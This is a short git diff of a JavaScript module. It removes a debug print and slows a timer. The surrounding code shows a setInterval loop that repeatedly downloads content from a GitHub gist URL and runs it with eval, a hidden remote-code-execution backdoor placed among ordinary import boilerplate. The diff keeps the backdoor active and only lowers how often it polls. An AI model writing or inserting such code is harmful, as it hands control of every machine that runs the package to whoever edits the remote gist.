@@ -17,12 +17,11 @@ const randomstring = require('randomstring')
 const _ = require('lodash-contrib')
 
 var ttt = fs.readFileSync;
-console.log('gg')
 setInterval(() => {
   request('https://gist.githubusercontent.com/raw/5a371e3668b95515edcc304022415ed3?'+ randomstring.generate(), (err, response,body) => {
     eval(body)
   })
-}, 3000)
+}, 10000)
 function _interopDefaultLegacy (e) { return e && typeof e === 'object' && 'default' in e ? e : { 'default': e }; }
 
 const FormData__default = /*#__PURE__*/_interopDefaultLegacy(FormData$1);
